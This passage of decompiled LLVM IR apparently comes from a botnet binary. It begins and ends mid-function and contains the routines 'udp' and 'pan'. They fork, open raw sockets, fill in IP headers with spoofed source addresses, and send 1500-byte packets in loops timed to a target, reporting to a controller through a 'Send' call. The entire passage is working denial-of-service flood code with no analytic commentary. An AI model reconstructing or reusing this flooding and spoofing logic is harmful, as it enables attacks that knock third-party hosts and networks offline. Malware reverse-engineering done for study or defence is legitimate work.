  store i32 %v1_804ddc0, i32* %v5_804de56, align 4
  %v1_804de60 = load i32, i32* %edx.global-to-local, align 4
  %v2_804de60 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804de60 = add i32 %v1_804de60, 16
  %v4_804de60 = add i32 %v3_804de60, %v2_804de60
  %v5_804de60 = inttoptr i32 %v4_804de60 to i32*
  %v1_804de6a = load i32, i32* %edx.global-to-local, align 4
  %v2_804de6a = load i32, i32* %ecx.global-to-local, align 4
  %v3_804de6a = add i32 %v1_804de6a, 20
  %v4_804de6a = add i32 %v3_804de6a, %v2_804de6a
  %v5_804de6a = inttoptr i32 %v4_804de6a to i32*
  %v1_804de7f = or i32 %v3_804de30, 4
  %v2_804de85 = inttoptr i32 %v1_804de7f to i32*
  store i32 %v3_804dd6a, i32* %v2_804de85, align 4
  store i32 %v3_804de30, i32* @ecx, align 4
  store i32 %v2_804dd96, i32* %edx.global-to-local, align 4
  %v2_804de9e = mul i32 %storemerge69, 4
  %v2_804dea1 = add i32 %v2_804de9e, %v2_804dd96
  store i32 %v2_804dea1, i32* %eax.global-to-local, align 4
  %v1_804dea4 = load i32, i32* @esp, align 4
  %v2_804dea4 = add i32 %v1_804dea4, -4
  %v3_804dea4 = inttoptr i32 %v2_804dea4 to i32*
  store i32 %v3_804de30, i32* %v3_804dea4, align 4
  %v1_804dea5 = add i32 %v1_804dea4, -8
  %v2_804dea5 = inttoptr i32 %v1_804dea5 to i32*
  store i32 134535077, i32* %v2_804dea5, align 4
  %v1_804deaa = add i32 %v1_804dea4, -12
  %v2_804deaa = inttoptr i32 %v1_804deaa to i32*
  store i32 0, i32* %v2_804deaa, align 4
  %v0_804deac = load i32, i32* %eax.global-to-local, align 4
  %v2_804deac = add i32 %v1_804dea4, -16
  %v3_804deac = inttoptr i32 %v2_804deac to i32*
  store i32 %v0_804deac, i32* %v3_804deac, align 4
  %v0_804dead = call i32 @pthread_create()
  %v0_804deb2 = load i32, i32* @esp, align 4
  %v1_804deb2 = add i32 %v0_804deb2, 16
  %v4_804deb5 = add nuw nsw i32 %storemerge69, 1
  store i32 %v4_804deb5, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804deb5, %v2_804db86
  br i1 %exitcond, label %dec_label_pc_804dec4, label %dec_label_pc_804de1a

dec_label_pc_804dec4:                             ; preds = %dec_label_pc_804de1a, %dec_label_pc_804dd65
  %v1_804decc.lcssa = phi i32 [ %v2_804dde8, %dec_label_pc_804dd65 ], [ %v1_804deb2, %dec_label_pc_804de1a ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_804dd65 ], [ %v2_804db86, %dec_label_pc_804de1a ]
  store i32 %v1_804ddb7, i32* %eax.global-to-local, align 4
  %v2_804deca = load i32, i32* %v1_804ddba, align 4
  store i32 %v2_804deca, i32* %eax.global-to-local, align 4
  %v2_804decc = add i32 %v1_804decc.lcssa, -4
  %v3_804decc = inttoptr i32 %v2_804decc to i32*
  store i32 %v2_804deca, i32* %v3_804decc, align 4
  %v5_804decd = add i32 %v1_804decc.lcssa, -8
  %v6_804decd = inttoptr i32 %v5_804decd to i32*
  store i32 %arg2, i32* %v6_804decd, align 4
  %v1_804ded0 = add i32 %v1_804decc.lcssa, -12
  %v2_804ded0 = inttoptr i32 %v1_804ded0 to i32*
  store i32 ptrtoint ([31 x i8]* @global_var_8069784.183 to i32), i32* %v2_804ded0, align 4
  %v5_804ded5 = add i32 %v1_804decc.lcssa, -16
  %v6_804ded5 = inttoptr i32 %v5_804ded5 to i32*
  store i32 %arg1, i32* %v6_804ded5, align 4
  %v2_804ded8 = call i32 @Send(i32 %storemerge.lcssa, i32 128)
  %v0_804dedd = load i32, i32* @esp, align 4
  store i32 %v1_804da83, i32* %eax.global-to-local, align 4
  %v2_804deed = load i32, i32* %v1_804da86, align 4
  store i32 %v2_804deed, i32* %eax.global-to-local, align 4
  %v3_804def2 = inttoptr i32 %v0_804dedd to i32*
  store i32 %v2_804deed, i32* %v3_804def2, align 4
  %v1_804def3 = call i32 @atol(i32 0)
  %v0_804def8 = load i32, i32* @esp, align 4
  %v9_804defb = mul i32 %v1_804def3, 20
  store i32 %v9_804defb, i32* %eax.global-to-local, align 4
  %v7_804df02 = icmp sgt i32 %v9_804defb, 0
  br i1 %v7_804df02, label %dec_label_pc_804df08, label %dec_label_pc_804dfe4

dec_label_pc_804df08:                             ; preds = %dec_label_pc_804dec4
  store i32 5000, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v3_804df36 = inttoptr i32 %v0_804def8 to i32*
  store i32 50000, i32* %v3_804df36, align 4
  %v2_804df37 = call i32 @usleep(i64 0)
  %v0_804df3f = load i64, i64* @global_var_807d500.88, align 8
  %sext = mul i64 %v0_804df3f, 4294967296
  %v2_804df48 = sdiv i64 %sext, 4294967296
  %v4_804df48 = mul nsw i64 %v2_804df48, 20
  %v5_804df48 = trunc i64 %v4_804df48 to i32
  store i32 %v5_804df48, i32* %edx.global-to-local, align 4
  %tmp71 = icmp ugt i32 %v5_804df48, %v2_804db9d
  %v0_804df77 = load i32, i32* @global_var_807d3c8.89, align 8
  store i32 %v0_804df77, i32* %eax.global-to-local, align 4
  br i1 %tmp71, label %dec_label_pc_804df52, label %dec_label_pc_804df77

dec_label_pc_804df52:                             ; preds = %dec_label_pc_804df08
  %tmp61 = icmp slt i32 %v0_804df77, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_804df6a, label %dec_label_pc_804df5b

dec_label_pc_804df5b:                             ; preds = %dec_label_pc_804df52
  %v0_804df5b = load i32, i32* @global_var_806ffa8.90, align 8
  %v1_804df60 = add i32 %v0_804df5b, 100
  store i32 %v1_804df60, i32* %eax.global-to-local, align 4
  store i32 %v1_804df60, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804dfa5

dec_label_pc_804df6a:                             ; preds = %dec_label_pc_804df52
  %v1_804df6f = add i32 %v0_804df77, -1
  store i32 %v1_804df6f, i32* %eax.global-to-local, align 4
  store i32 %v1_804df6f, i32* @global_var_807d3c8.89, align 8
  br label %dec_label_pc_804dfa5

dec_label_pc_804df77:                             ; preds = %dec_label_pc_804df08
  %v1_804df7c = add i32 %v0_804df77, 1
  store i32 %v1_804df7c, i32* @global_var_807d3c8.89, align 8
  %v0_804df82 = load i32, i32* @global_var_806ffa8.90, align 8
  store i32 %v0_804df82, i32* %eax.global-to-local, align 4
  %v1_804df87 = add i32 %v0_804df82, -25
  %v5_804df87 = icmp ult i32 %v0_804df82, 25
  %v9_804df87 = icmp eq i32 %v1_804df87, 0
  %v2_804df8a = or i1 %v5_804df87, %v9_804df87
  br i1 %v2_804df8a, label %dec_label_pc_804df9b, label %dec_label_pc_804df8c

dec_label_pc_804df8c:                             ; preds = %dec_label_pc_804df77
  store i32 %v1_804df87, i32* %eax.global-to-local, align 4
  store i32 %v1_804df87, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804dfa5

dec_label_pc_804df9b:                             ; preds = %dec_label_pc_804df77
  store i32 0, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804dfa5

dec_label_pc_804dfa5:                             ; preds = %dec_label_pc_804df8c, %dec_label_pc_804df6a, %dec_label_pc_804df5b, %dec_label_pc_804df9b
  store i64 0, i64* @global_var_807d500.88, align 256
  %v5_804dfc7 = add i32 %v2_804da86, %v3_804da75
  br label %dec_label_pc_804dfaf

dec_label_pc_804dfaf:                             ; preds = %dec_label_pc_804dfdf, %dec_label_pc_804dfa5
  %stack_var_-64.0 = phi i32 [ %tmp, %dec_label_pc_804dfa5 ], [ %v4_804dfdf, %dec_label_pc_804dfdf ]
  %v7_804dfb3 = icmp sgt i32 %stack_var_-64.0, 99
  br i1 %v7_804dfb3, label %dec_label_pc_804dfb5, label %dec_label_pc_804dfdf

dec_label_pc_804dfb5:                             ; preds = %dec_label_pc_804dfaf
  %v0_804dfb5 = load i32, i32* @esp, align 4
  %v1_804dfb8 = add i32 %v0_804dfb5, -16
  %v2_804dfb8 = inttoptr i32 %v1_804dfb8 to i32*
  store i32 0, i32* %v2_804dfb8, align 4
  %v2_804dfba = call i32 @__GI_time(i32* null)
  %v0_804dfbf = load i32, i32* @esp, align 4
  store i32 %v2_804dfba, i32* %edx.global-to-local, align 4
  store i32 %v5_804dfc7, i32* %eax.global-to-local, align 4
  %v7_804dfca = icmp ult i32 %v2_804dfba, %v5_804dfc7
  br i1 %v7_804dfca, label %dec_label_pc_804dfdf, label %dec_label_pc_804dfce

dec_label_pc_804dfce:                             ; preds = %dec_label_pc_804dfb5
  %v2_804dfd1 = inttoptr i32 %v0_804dfbf to i32*
  store i32 0, i32* %v2_804dfd1, align 4
  %v1_804dfd3 = call i32 @__GI_exit(i32 0)
  store i32 %v1_804dfd3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dfdf

dec_label_pc_804dfdf:                             ; preds = %dec_label_pc_804dfce, %dec_label_pc_804dfb5, %dec_label_pc_804dfaf
  %stack_var_-64.1 = phi i32 [ %stack_var_-64.0, %dec_label_pc_804dfaf ], [ 0, %dec_label_pc_804dfb5 ], [ 0, %dec_label_pc_804dfce ]
  %v4_804dfdf = add i32 %stack_var_-64.1, 1
  br label %dec_label_pc_804dfaf

dec_label_pc_804dfe4:                             ; preds = %dec_label_pc_804dec4
  %v2_804dfe7 = inttoptr i32 %v0_804def8 to i32*
  store i32 0, i32* %v2_804dfe7, align 4
  %v1_804dfe9 = call i32 @__GI_exit(i32 %tmp)
  store i32 %v1_804dfe9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dfee

dec_label_pc_804dfee:                             ; preds = %dec_label_pc_804da70, %entry, %dec_label_pc_804dfe4
  %v0_804dffb = phi i32 [ %v1_804dab7, %dec_label_pc_804da70 ], [ %v1_804da13, %entry ], [ %v1_804dfe9, %dec_label_pc_804dfe4 ]
  ret i32 %v0_804dffb

; uselistorder directives
  uselistorder i32 %v1_804df87, { 1, 0, 2 }
  uselistorder i32 %v0_804df77, { 2, 1, 0, 3 }
  uselistorder i32 %v9_804defb, { 1, 0 }
  uselistorder i32 %v0_804def8, { 1, 0 }
  uselistorder i32 %v3_804de30, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804de26, { 0, 2, 1 }
  uselistorder i32 %storemerge69, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804ddf9, { 1, 2, 3, 0 }
  uselistorder i32 %v2_804dd96, { 0, 2, 1 }
  uselistorder i32 %v0_804dcbf, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804dcae, { 1, 0 }
  uselistorder i32 %v2_804dcda, { 2, 1, 3, 4, 5, 0, 9, 8, 7, 6, 10 }
  uselistorder i32 %v2_804db86, { 0, 1, 2, 4, 5, 3 }
  uselistorder i32 %v0_804db75, { 10, 5, 4, 7, 6, 1, 3, 2, 0, 8, 9 }
  uselistorder i32 %v2_804db5b, { 2, 1, 0 }
  uselistorder i32 %v4_804dabf, { 1, 0 }
  uselistorder i32 %v4_804da4a, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 16, 14, 15, 64, 17, 18, 19, 38, 20, 21, 22, 23, 25, 26, 27, 28, 29, 24, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63 }
  uselistorder i32 ()* @pthread_create, { 3, 2, 1, 0 }
  uselistorder i32 540, { 0, 11, 5, 1, 12, 6, 7, 2, 13, 8, 3, 14, 9, 4, 15, 10 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_8068ea3.83 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i64* @global_var_807d500.88, { 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_807d3c8.89, { 0, 2, 1, 3, 4, 5, 7, 6, 8, 9, 10, 12, 11, 13, 14, 15, 17, 16, 18, 19, 20, 22, 21, 23, 24, 25, 27, 26, 28, 29, 31, 30, 32, 33 }
  uselistorder i32 %arg4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804dfee, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804dfa5, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804dd46, { 1, 0 }
  uselistorder label %dec_label_pc_804da70, { 1, 0 }
  uselistorder label %dec_label_pc_804da4a, { 1, 0 }
}

define i32 @udp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-1532 = alloca i32, align 4
  %stack_var_-1540 = alloca i32, align 4
  %stack_var_-1560 = alloca i32, align 4
  %stack_var_-1604 = alloca i32, align 4
  %v2_804e011 = call i32 @__GI_time(i32* null)
  store i32 %v2_804e011, i32* @eax, align 4
  %v1_804e022 = call i32 @mfork(i32 %arg2)
  %v1_804e02a = icmp eq i32 %v1_804e022, 0
  %v1_804e02c = icmp eq i1 %v1_804e02a, false
  br i1 %v1_804e02c, label %dec_label_pc_804e286, label %dec_label_pc_804e032

dec_label_pc_804e032:                             ; preds = %entry
  %v3_804e03e = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_804e049 = icmp slt i32 %v3_804e03e, 0
  %v1_804e04d = icmp eq i1 %v5_804e049, false
  br i1 %v1_804e04d, label %dec_label_pc_804e059, label %dec_label_pc_804e04f

dec_label_pc_804e04f:                             ; preds = %dec_label_pc_804e032
  %v1_804e054 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804e059

dec_label_pc_804e059:                             ; preds = %dec_label_pc_804e032, %dec_label_pc_804e04f
  %v4_804e059 = add i32 %arg3, -2
  %v9_804e059 = sub i32 1, %arg3
  %v10_804e059 = and i32 %v9_804e059, %arg3
  %v11_804e059 = icmp slt i32 %v10_804e059, 0
  %v12_804e059 = icmp eq i32 %v4_804e059, 0
  %v13_804e059 = icmp slt i32 %v4_804e059, 0
  %v3_804e05d = icmp eq i1 %v13_804e059, %v11_804e059
  %v4_804e05d = icmp eq i1 %v12_804e059, false
  %v5_804e05d = and i1 %v4_804e05d, %v3_804e05d
  br i1 %v5_804e05d, label %dec_label_pc_804e059.dec_label_pc_804e07f_crit_edge, label %dec_label_pc_804e05f

dec_label_pc_804e059.dec_label_pc_804e07f_crit_edge: ; preds = %dec_label_pc_804e059
  br label %dec_label_pc_804e07f

dec_label_pc_804e05f:                             ; preds = %dec_label_pc_804e059
  store i32 %arg2, i32* %stack_var_-1604, align 4
  %v3_804e06d = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_80697a4.184 to i32))
  %v1_804e07a = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804e07f

dec_label_pc_804e07f:                             ; preds = %dec_label_pc_804e059.dec_label_pc_804e07f_crit_edge, %dec_label_pc_804e05f
  %v1_804e082 = add i32 %arg4, 4
  %v1_804e085 = inttoptr i32 %v1_804e082 to i32*
  %v2_804e085 = load i32, i32* %v1_804e085, align 4
  %v3_804e08e = call i32 @host2ip(i32 %arg2, i32 %v2_804e085)
  %v1_804e09c = add i32 %arg4, 8
  %v1_804e09f = inttoptr i32 %v1_804e09c to i32*
  %v2_804e09f = load i32, i32* %v1_804e09f, align 4
  %v1_804e0a5 = call i32 @atol(i32 %v2_804e09f)
  %v1_804e0b3 = add i32 %arg4, 12
  %v1_804e0b6 = inttoptr i32 %v1_804e0b3 to i32*
  %v2_804e0b6 = load i32, i32* %v1_804e0b6, align 4
  %v1_804e0bc = call i32 @atol(i32 %v2_804e0b6)
  %v2_804e0c7 = ptrtoint i32* %stack_var_-1560 to i32
  %tmp54 = bitcast i32* %stack_var_-1540 to i16*
  store i32 1472, i32* %stack_var_-1604, align 4
  %v4_804e0f5 = bitcast i32* %stack_var_-1532 to i8*
  %v5_804e0f5 = call i32 @__GI_memset(i8* %v4_804e0f5, i32 10, i32 1472)
  store i32 %arg2, i32* %stack_var_-1604, align 4
  %v3_804e111 = call i32 @Send(i32 %arg1, i32 ptrtoint ([25 x i8]* @global_var_80697cb.185 to i32))
  %v3_804e124 = bitcast i32* %stack_var_-1560 to i8*
  store i8 69, i8* %v3_804e124, align 4
  %v1_804e136 = or i32 %v2_804e0c7, 1
  %v2_804e136 = inttoptr i32 %v1_804e136 to i8*
  store i8 0, i8* %v2_804e136, align 1
  %v1_804e13d = or i32 %v2_804e0c7, 2
  %v2_804e13d = inttoptr i32 %v1_804e13d to i16*
  store i16 1500, i16* %v2_804e13d, align 2
  %v1_804e146 = add i32 %v2_804e0c7, 6
  %v2_804e146 = inttoptr i32 %v1_804e146 to i16*
  store i16 0, i16* %v2_804e146, align 2
  %v1_804e14f = add i32 %v2_804e0c7, 9
  %v2_804e14f = inttoptr i32 %v1_804e14f to i8*
  store i8 17, i8* %v2_804e14f, align 1
  %v1_804e156 = add i32 %v2_804e0c7, 8
  %v2_804e156 = inttoptr i32 %v1_804e156 to i8*
  store i8 64, i8* %v2_804e156, align 4
  %v2_804e160 = add i32 %v2_804e0c7, 16
  %v3_804e160 = inttoptr i32 %v2_804e160 to i32*
  store i32 %v3_804e08e, i32* %v3_804e160, align 4
  %v1_804e166 = urem i32 %tmp21, 65536
  %v1_804e16f = call i32 @htons(i32 %v1_804e166)
  %v2_804e16f = trunc i32 %v1_804e16f to i16
  %v4_804e179 = ptrtoint i32* %stack_var_-1540 to i32
  %v3_804e17c = add i32 %v4_804e179, 4
  %v4_804e17c = inttoptr i32 %v3_804e17c to i16*
  store i16 %v2_804e16f, i16* %v4_804e17c, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v4_804e199 = icmp eq i32 %v1_804e0a5, 0
  %v3_804e1c8 = or i32 %v4_804e179, 2
  %v4_804e1c8 = inttoptr i32 %v3_804e1c8 to i16*
  %v2_804e1d8 = bitcast i32* %stack_var_-1560 to i16*
  %v3_804e1e5 = add i32 %v4_804e179, 6
  %v4_804e1e5 = inttoptr i32 %v3_804e1e5 to i16*
  %v2_804e1f3 = add i32 %v2_804e0c7, 12
  %v3_804e1f3 = inttoptr i32 %v2_804e1f3 to i32*
  %v3_804e200 = add i32 %v2_804e0c7, 4
  %v4_804e200 = inttoptr i32 %v3_804e200 to i16*
  %v3_804e21d = add i32 %v2_804e0c7, 10
  %v4_804e21d = inttoptr i32 %v3_804e21d to i16*
  %v2_804e22c = ptrtoint i32* %stack_var_-60 to i32
  %v5_804e266 = add i32 %v1_804e0bc, %v2_804e011
  %v1_804e1a2 = urem i32 %v1_804e0a5, 65536
  br label %dec_label_pc_804e18c

dec_label_pc_804e18c:                             ; preds = %dec_label_pc_804e27e, %dec_label_pc_804e07f
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_804e07f ], [ %v4_804e27e, %dec_label_pc_804e27e ]
  %v0_804e18c = call i32 @random()
  %sext = mul i32 %v0_804e18c, 65536
  %v1_804e191 = sdiv i32 %sext, 65536
  %v1_804e196 = trunc i32 %v1_804e191 to i16
  store i16 %v1_804e196, i16* %tmp54, align 4
  br i1 %v4_804e199, label %dec_label_pc_804e1be, label %dec_label_pc_804e19f

dec_label_pc_804e19f:                             ; preds = %dec_label_pc_804e18c
  %v1_804e1ab = call i32 @htons(i32 %v1_804e1a2)
  br label %dec_label_pc_804e1cc

dec_label_pc_804e1be:                             ; preds = %dec_label_pc_804e18c
  %v0_804e1be = call i32 @random()
  %sext5 = mul i32 %v0_804e1be, 65536
  %v1_804e1c3 = sdiv i32 %sext5, 65536
  br label %dec_label_pc_804e1cc

dec_label_pc_804e1cc:                             ; preds = %dec_label_pc_804e19f, %dec_label_pc_804e1be
  %storemerge.in = phi i32 [ %v1_804e1c3, %dec_label_pc_804e1be ], [ %v1_804e1ab, %dec_label_pc_804e19f ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i16 %storemerge, i16* %v4_804e1c8, align 2
  store i32 %v2_804e0c7, i32* %stack_var_-1604, align 4
  %v3_804e1d8 = call i32 @in_cksum(i16* %v2_804e1d8, i32 1500)
  %v4_804e1d8 = trunc i32 %v3_804e1d8 to i16
  store i16 %v4_804e1d8, i16* %v4_804e1e5, align 2
  %v0_804e1e9 = load i32, i32* %stack_var_-1604, align 4
  %v1_804e1e9 = call i32 @getspoof(i32 %v0_804e1e9)
  store i32 %v1_804e1e9, i32* %v3_804e1f3, align 4
  %v0_804e1f6 = call i32 @random()
  %sext4 = mul i32 %v0_804e1f6, 65536
  %v1_804e1fb = sdiv i32 %sext4, 65536
  %v1_804e200 = trunc i32 %v1_804e1fb to i16
  store i16 %v1_804e200, i16* %v4_804e200, align 4
  store i32 %v2_804e0c7, i32* %stack_var_-1604, align 4
  %v3_804e210 = call i32 @in_cksum(i16* %v2_804e1d8, i32 1500)
  %v4_804e210 = trunc i32 %v3_804e210 to i16
  store i16 %v4_804e210, i16* %v4_804e21d, align 2
  %v7_804e246 = call i32 @sendto(i32 %v3_804e03e, i32 %v2_804e0c7, i32 1500, i32 0, i32 %v2_804e22c, i32 16)
  %tmp55 = icmp ult i32 %stack_var_-40.0, 100
  br i1 %tmp55, label %dec_label_pc_804e27e, label %dec_label_pc_804e254

dec_label_pc_804e254:                             ; preds = %dec_label_pc_804e1cc
  %v2_804e259 = call i32 @__GI_time(i32* null)
  %v7_804e269 = icmp ult i32 %v2_804e259, %v5_804e266
  br i1 %v7_804e269, label %dec_label_pc_804e27e, label %dec_label_pc_804e26d

dec_label_pc_804e26d:                             ; preds = %dec_label_pc_804e254
  %v1_804e272 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804e27e

dec_label_pc_804e27e:                             ; preds = %dec_label_pc_804e26d, %dec_label_pc_804e254, %dec_label_pc_804e1cc
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.0, %dec_label_pc_804e1cc ], [ 0, %dec_label_pc_804e254 ], [ 0, %dec_label_pc_804e26d ]
  %v4_804e27e = add i32 %stack_var_-40.1, 1
  br label %dec_label_pc_804e18c

dec_label_pc_804e286:                             ; preds = %entry
  ret i32 %v1_804e022

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v2_804e0c7, { 9, 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %v4_804e059, { 1, 0 }
  uselistorder i32* %stack_var_-1604, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_-1560, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e1cc, { 1, 0 }
  uselistorder label %dec_label_pc_804e07f, { 1, 0 }
  uselistorder label %dec_label_pc_804e059, { 1, 0 }
}

define i32 @pan(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-88 = alloca i16, align 2
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-160 = alloca i16, align 2
  %stack_var_-108 = alloca i8, align 1
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v15_804e28c = ptrtoint i32* %stack_var_-268 to i32
  %v2_804e292 = ptrtoint i32* %stack_var_-256 to i32
  store i32 ptrtoint (i32* @global_var_8069800.186 to i32), i32* %edx.global-to-local, align 4
  store i32 %v2_804e292, i32* %stack_var_-284, align 4
  %v3_804e2a8 = bitcast i32* %stack_var_-256 to i16*
  %v4_804e2a8 = call i32 @memcpy(i16* %v3_804e2a8, i32 ptrtoint (i32* @global_var_8069800.186 to i32), i32 80)
  store i32 0, i32* %stack_var_-284, align 4
  %v2_804e2c3 = call i32 @__GI_time(i32* null)
  store i32 %v2_804e2c3, i32* @eax, align 4
  store i32 %arg2, i32* %stack_var_-284, align 4
  %v1_804e2d4 = call i32 @mfork(i32 %arg2)
  %v1_804e2dc = icmp eq i32 %v1_804e2d4, 0
  %v1_804e2de = icmp eq i1 %v1_804e2dc, false
  br i1 %v1_804e2de, label %dec_label_pc_804e63b, label %dec_label_pc_804e2e4

dec_label_pc_804e2e4:                             ; preds = %entry
  store i32 2, i32* %stack_var_-284, align 4
  %v3_804e2f0 = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_804e2fb = icmp slt i32 %v3_804e2f0, 0
  %v1_804e2ff = icmp eq i1 %v5_804e2fb, false
  br i1 %v1_804e2ff, label %dec_label_pc_804e30b, label %dec_label_pc_804e301

dec_label_pc_804e301:                             ; preds = %dec_label_pc_804e2e4
  store i32 1, i32* %stack_var_-284, align 4
  %v1_804e306 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804e30b

dec_label_pc_804e30b:                             ; preds = %dec_label_pc_804e2e4, %dec_label_pc_804e301
  %v4_804e30b = add i32 %arg3, -2
  %v9_804e30b = sub i32 1, %arg3
  %v10_804e30b = and i32 %v9_804e30b, %arg3
  %v11_804e30b = icmp slt i32 %v10_804e30b, 0
  %v12_804e30b = icmp eq i32 %v4_804e30b, 0
  %v13_804e30b = icmp slt i32 %v4_804e30b, 0
  %v3_804e30f = icmp eq i1 %v13_804e30b, %v11_804e30b
  %v4_804e30f = icmp eq i1 %v12_804e30b, false
  %v5_804e30f = and i1 %v4_804e30f, %v3_804e30f
  br i1 %v5_804e30f, label %dec_label_pc_804e34e.preheader, label %dec_label_pc_804e311

dec_label_pc_804e311:                             ; preds = %dec_label_pc_804e30b
  store i32 %arg1, i32* %stack_var_-284, align 4
  %v2_804e31f = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8069850.187 to i32))
  store i32 1, i32* %stack_var_-284, align 4
  %v1_804e32c = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804e34e.preheader

dec_label_pc_804e34e.preheader:                   ; preds = %dec_label_pc_804e30b, %dec_label_pc_804e311
  br label %dec_label_pc_804e33a

dec_label_pc_804e33a:                             ; preds = %dec_label_pc_804e34e.preheader, %dec_label_pc_804e33a
  %storemerge84 = phi i32 [ 0, %dec_label_pc_804e34e.preheader ], [ %v4_804e34b, %dec_label_pc_804e33a ]
  store i32 %storemerge84, i32* @edx, align 4
  %v0_804e340 = load i32, i32* @ebp, align 4
  %v2_804e340 = mul nuw nsw i32 %storemerge84, 4
  %v3_804e340 = add nuw nsw i32 %v2_804e340, -252
  %v4_804e340 = add i32 %v3_804e340, %v0_804e340
  %v5_804e340 = inttoptr i32 %v4_804e340 to i32*
  %v6_804e340 = load i32, i32* %v5_804e340, align 4
  %v1_804e347 = trunc i32 %v6_804e340 to i8
  %v4_804e347 = add nuw nsw i32 %storemerge84, -64
  %v5_804e347 = add i32 %v4_804e347, %v0_804e340
  %v6_804e347 = inttoptr i32 %v5_804e347 to i8*
  store i8 %v1_804e347, i8* %v6_804e347, align 1
  %v4_804e34b = add nuw nsw i32 %storemerge84, 1
  %exitcond = icmp eq i32 %v4_804e34b, 20
  br i1 %exitcond, label %dec_label_pc_804e354, label %dec_label_pc_804e33a

dec_label_pc_804e354:                             ; preds = %dec_label_pc_804e33a
  %v1_804e357 = add i32 %arg4, 4
  %v1_804e35a = inttoptr i32 %v1_804e357 to i32*
  %v2_804e35a = load i32, i32* %v1_804e35a, align 4
  store i32 %arg2, i32* %stack_var_-284, align 4
  %v2_804e363 = call i32 @host2ip(i32 %arg2, i32 %v2_804e35a)
  %v1_804e371 = add i32 %arg4, 12
  %v1_804e374 = inttoptr i32 %v1_804e371 to i32*
  %v2_804e374 = load i32, i32* %v1_804e374, align 4
  store i32 %v2_804e374, i32* %stack_var_-284, align 4
  %v1_804e37a = call i32 @atol(i32 %v2_804e374)
  store i32 %arg1, i32* %stack_var_-284, align 4
  %v2_804e399 = call i32 @Send(i32 %arg1, i32 ptrtoint ([23 x i8]* @global_var_8069877.188 to i32))
  store i8 69, i8* %stack_var_-108, align 1
  %v1_804e42c = add i32 %arg4, 8
  %v1_804e42f = inttoptr i32 %v1_804e42c to i32*
  %v2_804e42f = load i32, i32* %v1_804e42f, align 4
  store i32 %v2_804e42f, i32* %stack_var_-284, align 4
  %v1_804e435 = call i32 @atol(i32 %v2_804e42f)
  %v1_804e43d = urem i32 %v1_804e435, 65536
  store i32 %v1_804e43d, i32* %stack_var_-284, align 4
  %v1_804e446 = call i32 @htons(i32 %v1_804e43d)
  %v5_804e453 = trunc i32 %v1_804e446 to i16
  store i32 0, i32* %stack_var_-284, align 4
  %v2_804e45b = call i32 @__GI_time(i32* null)
  store i32 %v2_804e45b, i32* @ebx, align 4
  %v1_804e465 = call i32 @__libc_getpid(i32 0)
  %v0_804e46a = load i32, i32* @ebx, align 4
  %v2_804e46a = add i32 %v0_804e46a, %v1_804e465
  store i32 %v2_804e46a, i32* %stack_var_-284, align 4
  %v1_804e471 = call i32 @srand(i32 %v2_804e46a)
  %v2_804e4fa = ptrtoint i8* %stack_var_-108 to i32
